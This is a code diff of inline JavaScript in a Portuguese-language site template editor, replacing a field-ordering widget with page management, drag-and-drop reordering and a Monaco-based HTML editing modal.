-    const fieldCheckboxes = manager.querySelectorAll('.field-checkbox');
-    const fieldList = manager.querySelector('.field-order-list');
-    const emptyMessage = manager.querySelector('.empty-message');
-    
-    // Handle checkbox changes
-    fieldCheckboxes.forEach(function(checkbox) {
-        checkbox.addEventListener('change', function() {
-            if (this.checked) {
-                addFieldToList(fieldList, this.value, this.dataset.label, pageIndex, emptyMessage);
-            } else {
-                removeFieldFromList(fieldList, this.value);
-            }
-            updateEmptyMessage(fieldList, emptyMessage);
-            updateFieldOrders(fieldList, pageIndex);
-        });
-    });
-    
-    // Initialize drag and drop
-    enableDragAndDrop(fieldList, pageIndex, emptyMessage);
-    
-    // Set initial empty message state
-    updateEmptyMessage(fieldList, emptyMessage);
-}
+// Auto-generate slug from name
+document.getElementById('name').addEventListener('input', function() {
+    const slug = this.value.toLowerCase()
+        .trim()
+        .replace(/[^a-z0-9\s\-_]/g, '')
+        .replace(/\s+/g, '_')
+        .replace(/_+/g, '_');
+    document.getElementById('slug').value = slug;
+});
 
-function addFieldToList(list, fieldType, fieldLabel, pageIndex, emptyMessage) {
-    // Check if field already exists
-    const existing = list.querySelector(`[data-field-type="${fieldType}"]`);
-    if (existing) return;
+// Add new page
+document.getElementById('addPageBtn').addEventListener('click', function() {
+    const template = document.getElementById('pageTemplate');
+    const clone = template.content.cloneNode(true);
+    const pageItem = clone.querySelector('.page-list-item');
     
-    const li = document.createElement('li');
-    li.className = 'list-group-item d-flex justify-content-between align-items-center field-order-item';
-    li.draggable = true;
-    li.dataset.fieldType = fieldType;
+    pageItem.setAttribute('data-page-index', pageCounter);
     
-    const fieldCount = list.children.length;
-    
-    li.innerHTML = `
-        <span><i class="fas fa-grip-vertical me-2 text-muted"></i>${fieldLabel}</span>
-        <input type="hidden" name="pages[${pageIndex}][fields][${fieldCount}][type]" value="${fieldType}" class="field-type-input">
-        <input type="hidden" name="pages[${pageIndex}][fields][${fieldCount}][label]" value="${fieldLabel}" class="field-label-input">
-        <input type="hidden" name="pages[${pageIndex}][fields][${fieldCount}][order]" value="${fieldCount}" class="field-order-input">
-    `;
-    
-    list.appendChild(li);
-    
-    // Reinitialize drag handlers for new item
-    initDragHandlers(li);
-}
-
-function removeFieldFromList(list, fieldType) {
-    const item = list.querySelector(`[data-field-type="${fieldType}"]`);
-    if (item) {
-        item.remove();
-    }
-}
-
-function updateEmptyMessage(list, emptyMessage) {
-    if (!emptyMessage) return;
-    
-    if (list.children.length === 0) {
-        emptyMessage.style.display = 'block';
-    } else {
-        emptyMessage.style.display = 'none';
-    }
-}
-
-function updateFieldOrders(list, pageIndex) {
-    const items = list.querySelectorAll('.field-order-item');
-    items.forEach(function(item, index) {
-        const typeInput = item.querySelector('.field-type-input');
-        const labelInput = item.querySelector('.field-label-input');
-        const orderInput = item.querySelector('.field-order-input');
-        
-        // Update input names and order
-        if (typeInput) {
-            typeInput.name = `pages[${pageIndex}][fields][${index}][type]`;
-        }
-        if (labelInput) {
-            labelInput.name = `pages[${pageIndex}][fields][${index}][label]`;
-        }
-        if (orderInput) {
-            orderInput.name = `pages[${pageIndex}][fields][${index}][order]`;
-            orderInput.value = index;
+    // Update all name attributes
+    pageItem.querySelectorAll('[name]').forEach(input => {
+        const nameAttr = input.getAttribute('name') || input.tagName.toLowerCase();
+        if (nameAttr.includes('name')) {
+            input.setAttribute('name', `pages[${pageCounter}][name]`);
+        } else if (nameAttr.includes('type') || input.classList.contains('page-type-select')) {
+            input.setAttribute('name', `pages[${pageCounter}][type]`);
+        } else if (nameAttr.includes('order') || input.classList.contains('page-order')) {
+            input.setAttribute('name', `pages[${pageCounter}][order]`);
+            input.value = pageCounter + 1;
+        } else if (nameAttr.includes('id') && input.type === 'hidden' && !input.classList.contains('page-content-input')) {
+            input.setAttribute('name', `pages[${pageCounter}][id]`);
+            input.value = `page_${Date.now()}`;
+        } else if (input.classList.contains('page-content-input')) {
+            input.setAttribute('name', `pages[${pageCounter}][content]`);
         }
     });
-}
-
-function enableDragAndDrop(list, pageIndex, emptyMessage) {
-    const items = list.querySelectorAll('.field-order-item');
-    items.forEach(function(item) {
-        initDragHandlers(item);
-    });
     
-    list.addEventListener('dragover', function(e) {
+    // Update edit button
+    const editBtn = pageItem.querySelector('.edit-html-btn');
+    editBtn.setAttribute('data-page-index', pageCounter);
+    
+    document.getElementById('pagesList').appendChild(pageItem);
+    
+    // Attach event listeners
+    attachPageEvents(pageItem);
+    
+    pageCounter++;
+});
+
+// Edit HTML button
+document.addEventListener('click', function(e) {
+    if (e.target.closest('.edit-html-btn')) {
         e.preventDefault();
-        const afterElement = getDragAfterElement(list, e.clientY);
-        const dragging = document.querySelector('.dragging');
+        const btn = e.target.closest('.edit-html-btn');
+        const pageItem = btn.closest('.page-list-item');
         
-        if (afterElement == null) {
-            list.appendChild(dragging);
+        if (!pageItem) {
+            console.error('Page item not found');
+            return;
+        }
+        
+        const pageIndex = pageItem.getAttribute('data-page-index');
+        
+        // Safely get page name
+        const nameInput = pageItem.querySelector('[name*="[name]"]');
+        const pageName = nameInput && nameInput.value ? nameInput.value : 'Nova Página';
+        const contentInput = pageItem.querySelector('.page-content-input');
+        
+        currentEditingPageIndex = pageIndex;
+        document.getElementById('modalPageName').textContent = pageName;
+        
+        // Check if Monaco Editor is ready
+        if (!monacoEditor) {
+            // Show loading and wait
+            const checkEditor = setInterval(() => {
+                if (monacoEditor) {
+                    clearInterval(checkEditor);
+                    monacoEditor.setValue(contentInput && contentInput.value ? contentInput.value : '');
+                    htmlEditorModal.show();
+                }
+            }, 100);
+            
+            // Timeout after 5 seconds
+            setTimeout(() => {
+                clearInterval(checkEditor);
+                if (!monacoEditor) {
+                    alert('Erro ao carregar o editor. Por favor, recarregue a página.');
+                }
+            }, 5000);
         } else {
-            list.insertBefore(dragging, afterElement);
+            // Monaco is ready, set value and show
+            monacoEditor.setValue(contentInput && contentInput.value ? contentInput.value : '');
+            htmlEditorModal.show();
         }
-    });
-    
-    list.addEventListener('drop', function(e) {
-        e.preventDefault();
-        updateFieldOrders(list, pageIndex);
-    });
-}
+    }
+});
 
-function initDragHandlers(item) {
-    item.addEventListener('dragstart', function() {
-        this.classList.add('dragging');
-    });
+// Save HTML from modal
+document.getElementById('saveHtmlBtn').addEventListener('click', function() {
+    const html = monacoEditor ? monacoEditor.getValue() : '';
+    const pageItem = document.querySelector(`[data-page-index="${currentEditingPageIndex}"]`);
+    const contentInput = pageItem.querySelector('.page-content-input');
     
-    item.addEventListener('dragend', function() {
-        this.classList.remove('dragging');
-        document.querySelectorAll('.drag-over').forEach(function(el) {
-            el.classList.remove('drag-over');
-        });
-    });
-}
+    contentInput.value = html;
+    htmlEditorModal.hide();
+    
+    // Show success feedback
+    const btn = pageItem.querySelector('.edit-html-btn');
+    btn.innerHTML = '<i class="fas fa-check me-1"></i>HTML Salvo';
+    btn.classList.remove('btn-outline-primary');
+    btn.classList.add('btn-success');
+    
+    setTimeout(() => {
+        btn.innerHTML = '<i class="fas fa-code me-1"></i>Editar HTML';
+        btn.classList.remove('btn-success');
+        btn.classList.add('btn-outline-primary');
+    }, 2000);
+});
 
-function getDragAfterElement(list, y) {
-    const draggableElements = [...list.querySelectorAll('.field-order-item:not(.dragging)')];
+// Remove page
+document.addEventListener('click', function(e) {
+    if (e.target.closest('.remove-page-btn')) {
+        if (confirm('Tem certeza que deseja remover esta página?')) {
+            const pageItem = e.target.closest('.page-list-item');
+            pageItem.remove();
+            reindexPages();
+        }
+    }
+});
+
+// Validate only one home page
+document.addEventListener('change', function(e) {
+    if (e.target.classList.contains('page-type-select')) {
+        if (e.target.value === 'home') {
+            // Remove home from all other pages
+            document.querySelectorAll('.page-type-select').forEach(select => {
+                if (select !== e.target && select.value === 'home') {
+                    select.value = 'custom';
+                    select.closest('.page-list-item').classList.remove('page-home');
+                }
+            });
+            e.target.closest('.page-list-item').classList.add('page-home');
+        } else {
+            e.target.closest('.page-list-item').classList.remove('page-home');
+        }
+    }
+});
+
+// Drag and Drop
+let draggedItem = null;
+
+document.addEventListener('dragstart', function(e) {
+    if (e.target.classList.contains('page-list-item')) {
+        draggedItem = e.target;
+        e.target.classList.add('dragging');
+    }
+});
+
+document.addEventListener('dragend', function(e) {
+    if (e.target.classList.contains('page-list-item')) {
+        e.target.classList.remove('dragging');
+        reindexPages();
+    }
+});
+
+document.addEventListener('dragover', function(e) {
+    e.preventDefault();
+    const afterElement = getDragAfterElement(document.getElementById('pagesList'), e.clientY);
+    const pagesList = document.getElementById('pagesList');
     
-    return draggableElements.reduce(function(closest, child) {
+    if (afterElement == null) {
+        pagesList.appendChild(draggedItem);
+    } else {
+        pagesList.insertBefore(draggedItem, afterElement);
+    }
+});
+
+function getDragAfterElement(container, y) {
+    const draggableElements = [...container.querySelectorAll('.page-list-item:not(.dragging)')];
+    
+    return draggableElements.reduce((closest, child) => {
         const box = child.getBoundingClientRect();
         const offset = y - box.top - box.height / 2;
         
@@ -687,5 +501,40 @@ function getDragAfterElement(list, y) {
         }
     }, { offset: Number.NEGATIVE_INFINITY }).element;
 }
+
+function reindexPages() {
+    const pages = document.querySelectorAll('.page-list-item');
+    pages.forEach((page, index) => {
+        page.setAttribute('data-page-index', index);
+        
+        // Update all name attributes
+        page.querySelectorAll('[name^="pages["]').forEach(input => {
+            const currentName = input.getAttribute('name');
+            const newName = currentName.replace(/pages\[\d+\]/, `pages[${index}]`);
+            input.setAttribute('name', newName);
+        });
+        
+        // Update order
+        const orderInput = page.querySelector('.page-order');
+        if (orderInput) {
+            orderInput.value = index + 1;
+        }
+        
+        // Update edit button
+        const editBtn = page.querySelector('.edit-html-btn');
+        if (editBtn) {
+            editBtn.setAttribute('data-page-index', index);
+        }
+    });
+}
+
+function attachPageEvents(pageItem) {
+    pageItem.setAttribute('draggable', 'true');
+}
+
+// Attach events to existing pages
+document.querySelectorAll('.page-list-item').forEach(attachPageEvents);
+
+console.log('✓ Template editor initialized');
 </script>
 {% endblock %}
